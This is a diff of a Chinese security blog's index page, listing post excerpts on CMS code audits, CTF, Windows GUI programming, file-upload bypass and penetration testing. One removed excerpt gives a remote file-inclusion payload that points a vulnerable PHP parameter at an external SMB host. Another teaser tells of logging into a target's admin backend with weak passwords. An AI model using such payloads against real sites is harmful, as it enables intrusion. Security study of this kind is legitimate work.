@@ -194,6 +194,647 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/" target="_self">
+          zzcms的再一次审计
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/10/19/zzcms%E7%9A%84%E5%86%8D%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/" target="_self">
+          
+          
+            
+          
+          前言
+首发 奇安信攻防社区https://forum.butian.net/share/640
+在看了社区https://forum.butian.net/share/460师傅的文章后 找师傅要到源码 然后在次对zzcms发起了审计
+
+审计开始
+首先打开页面
+
+
+第一处sql
+
+来到ask/search.php 页面 这里定义了一个$fp 引入了一个模板 然后通过$f用fopen函数用只读的方式
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-10-19 01:14" pubdate>
+              2021-10-19
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web/">web</a>
+            
+              <a href="/tags/PHP/">PHP</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/" target="_self">
+          semcms审计
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/10/19/semcms%E5%AE%A1%E8%AE%A1/" target="_self">
+          
+          
+            
+          
+          前言
+刚开始学审计 也是看了社区们师傅的文章https://forum.butian.net/share/387可能是自己太菜了 感觉不太详细 就自己审了一下
+
+漏洞分析
+先打开cms 简单浏览一下
+
+
+看起来视乎是个商城一样的网站 不管随便点点 然后来到代码
+
+第一处
+然后看到index.php文件，发现里面用include_once 包含了3个文件
+
+
+include_once() 语句是指在
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-10-19 01:12" pubdate>
+              2021-10-19
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web/">web</a>
+            
+              <a href="/tags/PHP/">PHP</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/09/26/ctf-crypto1/" target="_self">
+          ctf-crypto1
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/09/26/ctf-crypto1/" target="_self">
+          
+          
+            
+          
+          前言一次巧合的情况下点开了一个ctf比赛 一直没玩过ctf 第一次  0基础分析 签到题crypto的
+题目：1234567891011121314#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomflag=b&#x27;flag&#123;***************
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-09-26 23:15" pubdate>
+              2021-09-26
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/CTF/">CTF</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/CTF/">CTF</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_self">
+          某商城代码审计
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/09/04/%E6%9F%90%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_self">
+          
+          
+            
+          
+          审计开始第一处
+先来到admin.php页面 先不登录
+
+
+
+查看源码
+
+
+
+admin.php 页面require()引入了一个common.php页面require()是php的内置函数，作用是引入或者包含外部php文件。工作原理：当本身php文件被执行时，则外部文件的内容就将被包含进该自身php文件中；当包含的外部文件发生错误时，系统将抛出错误提示，并且停止php文件的执行。注意：使用req
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-09-04 08:26" pubdate>
+              2021-09-04
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web/">web</a>
+            
+              <a href="/tags/PHP/">PHP</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/" target="_self">
+          windows编程通用控件
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/30/windows%E7%BC%96%E7%A8%8B%E9%80%9A%E7%94%A8%E6%8E%A7%E4%BB%B6/" target="_self">
+          
+          
+            
+          
+          
+
+进度条和滑块控件
+
+
+
+
+
+
+
+
+
+
+运行
+
+
+
+用滑块控制进度条
+
+
+
+
+
+
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;Windows.h&gt;#include&lt;CommCtrl.h&gt;#include&quot;reso
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-30 20:45" pubdate>
+              2021-08-30
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Windows/">Windows</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Windows/">Windows</a>
+            
+              <a href="/tags/C/">C++</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_self">
+          windows编程控件的使用
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/29/windows%E7%BC%96%E7%A8%8B%E6%8E%A7%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_self">
+          
+          
+            
+          
+          控件的使用
+
+
+复选框和单选框的创建
+
+
+DialogBoxW 用这个函数创建对话框
+
+
+
+标题可以通过这样修改标题
+
+
+然后添加几个多选框和点选框
+
+
+
+直接ctrl+D  可以看见都是标了序号的 然后看见这个单选框
+
+
+
+随便选一个右键属性
+
+
+
+有一个组的属性  值是FALSE   这几个单选框的组属性都是false  所以目前这几个都是一组的  但是如果把喜欢 和不确定改为 true之后 
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-29 17:43" pubdate>
+              2021-08-29
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Windows/">Windows</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Windows/">Windows</a>
+            
+              <a href="/tags/C/">C++</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/" target="_self">
+          一次简单的web到上线
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/29/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84web%E5%88%B0%E4%B8%8A%E7%BA%BF/" target="_self">
+          
+          
+            
+          
+          渗透开始
+首先来到目标的后台
+
+
+
+看见这种很简陋 就感觉有洞试了一下弱口令 靠 直接进了
+
+
+
+然后通过改包  也是可以登录的
+
+
+
+改包进来然后修改账户 发现这账号有点离谱
+
+
+然后就开始在后台找找能不能拿shell 的地方导入的地方可以上传文件
+
+
+
+但是只能上传excel文件
+
+
+
+尝试改文件后缀 结果失败了 然后继续找其他突破口
+
+
+
+这里有个查询的地方 然后开启抓包 因为这种查询的地方
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-29 08:36" pubdate>
+              2021-08-29
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Web/">Web</a>
+            
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/" target="_self">
+          windows对话框资源
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/27/windows%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%B5%84%E6%BA%90/" target="_self">
+          
+          
+            
+          
+          
+
+对话框的创建
+
+
+
+模态对话框和非模态对话框的区别就是  非模态对话框  如果被打开了   你还可以继续操作这个对话框后面的其他对话框
+
+
+
+就比如这个属性对话框就是一个非模态对话框  打开它的同时  一样可以操作后面的main.app这些
+
+
+创建非模态对话框
+
+
+
+
+往对话框添加东西 也是很简单的  直接拖
+
+
+
+
+直接点工具箱  想添加什么 拖过去就行了
+
+
+
+然后保存  然后在来运行刚
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-27 20:54" pubdate>
+              2021-08-27
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Windows/">Windows</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Windows/">Windows</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/" target="_self">
+          windwos编程资源操作2
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/26/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C2/" target="_self">
+          
+          
+            
+          
+          
+
+还是和前面的一样 先添加资源
+
+
+
+
+这是顶级菜单   以及 子菜单
+
+
+
+然后保存
+
+
+还是先用前面的部分的代码
+
+
+然后 开始添加菜单
+
+第一种方式
+直接在创建窗口的时候创建菜单
+
+
+
+
+直接运行
+
+
+
+菜单直接出来了
+
+第二种方式:
+通过传到createwindwoW 函数中  因为这个函数接受一个菜单句柄参数
+
+
+
+
+因为涉及到句柄  所以就和前面的资源操作一样  需要先导入菜单
+
+
+
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-26 20:26" pubdate>
+              2021-08-26
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/Windows/">Windows</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Windows/">Windows</a>
+            
+              <a href="/tags/C/">C++</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/08/24/windwos%E7%BC%96%E7%A8%8B%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C1/" target="_self">
           windwos资源操作1
         </a>
@@ -258,537 +899,6 @@ hInst
               <a href="/tags/Windows/">Windows</a>
             
               <a href="/tags/C/">C++</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/" target="_self">
-          windows窗口控件
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/23/windwos%E7%AA%97%E5%8F%A3%E6%8E%A7%E4%BB%B6/" target="_self">
-          
-          
-            
-          
-          
-
-
-1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include&lt;Windows.h&gt;#include&lt;iostream&gt;#include&lt;CommCtrl.h&gt;L
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-23 22:51" pubdate>
-              2021-08-23
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/Windows/">Windows</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Windows/">Windows</a>
-            
-              <a href="/tags/C/">C++</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/" target="_self">
-          windows编程消息处理
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E6%B6%88%E6%81%AF%E5%A4%84%E7%90%86/" target="_self">
-          
-          
-            
-          
-          
-
-
-
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include&lt;Windows.h&gt;
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-23 22:51" pubdate>
-              2021-08-23
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/Windows/">Windows</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Windows/">Windows</a>
-            
-              <a href="/tags/C/">C++</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/" target="_self">
-          windows编程第一个窗口程序
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/" target="_self">
-          
-          
-            
-          
-          
-
-
-123456789101112typedef struct tagWNDCLASSW &#123;  UINT      style;  WNDPROC   lpfnWndProc;  int       cbClsExtra;  int       cbWndExtra;  HINSTANCE hInstance;  HICON     hIcon;  HCURSOR   hCursor;
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-23 22:50" pubdate>
-              2021-08-23
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/Windows/">Windows</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Windows/">Windows</a>
-            
-              <a href="/tags/C/">C++</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/" target="_self">
-          windows编程字符串处理
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/" target="_self">
-          
-          
-            
-          
-          
-
-
-
-
-
-
-tchar 是14的原因是 因为他是由环境决定   当前环境 默认是Unicode的 WCHAR 型   所以  和WCHAR 型的大小一样  如果 改变环境   tchar的大小也会跟着改变
-
-
-
-改变之后  tchar的大小就变为7了
-
-
-
-然后MessageBox函数如果用tchar类型 就不用管环境是什么了  因为tchar自动根据环境来变化
-
-
-12345678910111
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-23 22:50" pubdate>
-              2021-08-23
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/Windows/">Windows</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Windows/">Windows</a>
-            
-              <a href="/tags/C/">C++</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/" target="_self">
-          文件上传绕过思路拓展
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/" target="_self">
-          
-          
-            
-          
-          案例一一次项目渗透时，通过往png后缀随便加个字符可知该上传点为白名单上传，正常情况下无法绕过
-
-通过观察接口信息，发现接口名字为UploadImg，猜测该接口用于图片上传，按照开发的习惯，保不准会存在temp、test，这类的接口，随后通过fuzz找到存在的上传接口（file），但此时的接口（file）上传文件仍旧存在限制，需要绕过。
-
-由于黑名单限制不够严谨，经过多个伪后缀尝试，发现.cer后
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-23 22:34" pubdate>
-              2021-08-23
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/web/">web</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/" target="_self">
-          从控制台到窗口程序
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/" target="_self">
-          
-          
-            
-          
-          从控制台到窗口程序
-
-
-
-
-
-如果不知道函数什么意思 直接选中函数 然后按F1  可以直接打开文档
-
-
-
-
-直接按F1  查看参数配置
-
-
-MessageBox  消息框函数：
-
-
-显示一个模式对话框，其中包含一个系统图标、一组按钮和一条特定于应用程序的简短消息，例如状态或错误信息。
-
-
-消息框返回一个整数值，指示用户单击了哪个按钮。
-
-语法：
-123456int MessageBox(  HWN
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-21 20:05" pubdate>
-              2021-08-21
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/Windows/">Windows</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Windows/">Windows</a>
-            
-              <a href="/tags/C/">C++</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" target="_self">
-          php文件包含漏洞（allow_url_include=Off）的绕过方法
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" target="_self">
-          
-          
-            
-          
-          分享几个当allow_url_include = Off时的文件包含漏洞的绕过方法。
-
-假设服务端的php代码（aaa.php）如下图所示：
-第1种：smb协议Payload：http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm
-
-这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器.
-首先在VPS上搭建Samb
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-08-21 12:44" pubdate>
-              2021-08-21
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/PHP/">PHP</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/web/">web</a>
-            
-              <a href="/tags/PHP/">PHP</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_self">
-          信息收集
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_self">
-          
-          
-            
-          
-          信息收集信息收集是渗透最重要的阶段，通过一系列的操作尽可能多的收集到多的目标的各种信息，只有先收集到多的信息之后才有利于后续的渗透。
-信息收集方式主动收集：与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息
-被动收集：不与目标主机进行直接交互，通过搜索引擎或者社会工程等方式间接的获取目标主机的信息
-一、收集域名信息知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，包括
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-05-17 20:34" pubdate>
-              2021-05-17
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/web/">web</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" target="_self">
-          Hexo博客搭建
-        </a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2021/05/16/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" target="_self">
-          
-          
-            
-          
-          安装安装前提安装 Hexo 相当简单，只需要先安装下列应用程序即可：
-
-Node.js(Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)
-Git如果您的电脑中已经安装上述必备程序，那么恭喜您！你可以直接前往 安装 Hexo 步骤。如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。安装 Git
-Windows：下载并安装 git.
-Mac：使用
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2021-05-16 19:39" pubdate>
-              2021-05-16
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-category"></i>
-            
-              <a href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
-            
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/hexo/">hexo</a>
             
           </div>
         
